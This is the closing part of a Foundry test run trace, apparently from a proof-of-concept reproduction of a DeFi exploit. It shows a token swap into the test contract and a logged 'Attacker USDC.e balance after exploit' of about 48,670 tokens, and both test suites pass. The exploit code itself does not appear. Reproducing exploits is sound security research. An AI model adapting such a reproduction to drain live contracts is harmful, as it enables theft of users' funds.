    │   │   ├─ emit Swap(sender: 0x60aE616a2155Ee3d9A68541Ba4544862310933d4, amount0In: 0, amount1In: 180886234472865834842570 [1.808e23], amount0Out: 48670713898 [4.867e10], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 48670713898 [4.867e10]
    │   └─ ← [Stop] 
    ├─ [886] 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 48670713898 [4.867e10]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC.e balance after exploit", val: 48670713898 [4.867e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 302.35ms (5.66ms CPU time)

Ran 2 test suites in 304.26ms (579.39ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
